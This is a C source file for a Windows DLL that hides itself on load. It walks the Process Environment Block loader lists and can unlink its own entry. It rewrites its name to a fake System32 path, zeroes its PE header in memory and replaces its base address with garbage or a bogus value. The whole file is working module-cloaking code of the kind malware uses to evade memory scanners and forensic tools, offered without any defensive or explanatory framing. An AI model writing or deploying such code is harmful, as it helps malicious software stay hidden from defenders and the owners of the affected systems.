#include <stdio.h>
#include <windows.h>
#include <shlwapi.h>
#include <winternl.h>
#include "structs.h"

// Check ZwQueryVirtualMemory syscall as well
int MorphModule(WCHAR * modName, WCHAR * newName, UINT_PTR newAddr, BOOL Remove) {
 // get the offset of Process Environment Block (PEB) depending on the architecture (x86 or x64) of the process
#ifdef _M_IX86 
    mPPEB pPEB = (mPPEB) __readfsdword(0x30);
#else
    mPPEB pPEB = (mPPEB) __readgsqword(0x60);
#endif
 DWORD old = 0;
 
 _LIST_ENTRY * f = pPEB->Ldr->InLoadOrderModuleList.Flink;
 // if Remove is set, unlink the object from the lists in InLoadOrderLinks
 while (TRUE & Remove) {
        PLDR_DATA_TBL_ENTRY dataEntry = CONTAINING_RECORD(f, LDR_DATA_TBL_ENTRY, InLoadOrderLinks);
        if (wcsstr(dataEntry->FullDllName.Buffer, modName) != NULL) {
   dataEntry->HashLinks.Blink->Flink = dataEntry->HashLinks.Flink;
   dataEntry->HashLinks.Flink->Blink = dataEntry->HashLinks.Blink;
   dataEntry->InLoadOrderLinks.Blink->Flink = (PLIST_ENTRY) dataEntry->InLoadOrderLinks.Flink;
   dataEntry->InLoadOrderLinks.Flink->Blink = (PLIST_ENTRY) dataEntry->InLoadOrderLinks.Blink;
   break;
  }
  f = dataEntry->InLoadOrderLinks.Flink;
 } 
 
 f = pPEB->Ldr->InInitializationOrderModuleList.Flink;
 // if Remove is set, unlink the object from the lists in InInitializationOrderLinks
 while (TRUE & Remove) {
  PLDR_DATA_TBL_ENTRY dataEntry = CONTAINING_RECORD(f, LDR_DATA_TBL_ENTRY, InInitializationOrderLinks);
  if (wcsstr(dataEntry->FullDllName.Buffer, modName) != NULL) {
   dataEntry->HashLinks.Blink->Flink = dataEntry->HashLinks.Flink;
   dataEntry->HashLinks.Flink->Blink = dataEntry->HashLinks.Blink;
   dataEntry->InInitializationOrderLinks.Blink->Flink = (PLIST_ENTRY) dataEntry->InInitializationOrderLinks.Flink;
   dataEntry->InInitializationOrderLinks.Flink->Blink = (PLIST_ENTRY) dataEntry->InInitializationOrderLinks.Blink;
   break;
  }
  f = dataEntry->InInitializationOrderLinks.Flink;
 }
 f = pPEB->Ldr->InMemoryOrderModuleList.Flink;
 while (TRUE) {
  PLDR_DATA_TBL_ENTRY dataEntry = CONTAINING_RECORD(f, LDR_DATA_TBL_ENTRY, InMemoryOrderLinks);
  //DebugOutW(L"[IN MEM] found: %s (%p)\n", dataEntry->FullDllName.Buffer, dataEntry);
  // check if the appropriate object is found
  if (wcsstr(dataEntry->FullDllName.Buffer, modName) != NULL) {
   
   // fix FullDllName UNICODE string length and save fake module name
   dataEntry->FullDllName.Length = wcslen(newName) * 2;
   wcscpy(dataEntry->FullDllName.Buffer, newName);
   
   // fix BaseDllName UNICODE string length and save fake module name
   dataEntry->BaseDllName.Length = wcslen(PathFindFileNameW(newName)) * 2;
   wcscpy(dataEntry->BaseDllName.Buffer, PathFindFileNameW(newName));
   
   // erase the PE header of the module
   VirtualProtect(dataEntry->DllBase, 4096, PAGE_READWRITE, &old);
   ZeroMemory(dataEntry->DllBase, 4096);
   VirtualProtect(dataEntry->DllBase, 4096, old, &old);
   
   // change module's BaseAddress and SizeOfImage to some random value
   void * mem = NULL;
   if (!newAddr) {
    mem = VirtualAlloc(0, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    dataEntry->DllBase = mem;
   }
   else
    dataEntry->DllBase = (PVOID) newAddr;
   dataEntry->SizeOfImage = rand();
   
   // fill the fake module page with garbage for more confusion
   if (mem) {
    BYTE * m = (BYTE *) mem;
    for (int i = 0; i < 4096; i++)
     *m++ = (BYTE) rand();
   }
   
   // if Remove is set, unlink the object from the lists in InMemoryOrderLinks
   if (Remove) {
    dataEntry->HashLinks.Blink->Flink = dataEntry->HashLinks.Flink;
    dataEntry->HashLinks.Flink->Blink = dataEntry->HashLinks.Blink;
    dataEntry->InMemoryOrderLinks.Blink->Flink = (PLIST_ENTRY) dataEntry->InMemoryOrderLinks.Flink;
    dataEntry->InMemoryOrderLinks.Flink->Blink = (PLIST_ENTRY) dataEntry->InMemoryOrderLinks.Blink;
   }
   break;
  }
  f = dataEntry->InMemoryOrderLinks.Flink;
 }
 return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved) {
 WCHAR procModulePath[MAX_PATH];
    switch (dwReason)  {
  case DLL_PROCESS_ATTACH:
   GetModuleFileNameW(hinst, procModulePath, MAX_PATH);
   MorphModule((WCHAR *) PathFindFileNameW(procModulePath), (WCHAR *) L"C:\\Windows\\System32\\legit.dll", 0xfeeddeadbeef, FALSE);
   //L"C:\\Windows\\System32\\softkbd.dll"
   break;
   
  case DLL_THREAD_ATTACH:
   break;
   
  case DLL_THREAD_DETACH:
   break;
   
  case DLL_PROCESS_DETACH:
   break;
 }
    return TRUE;
}
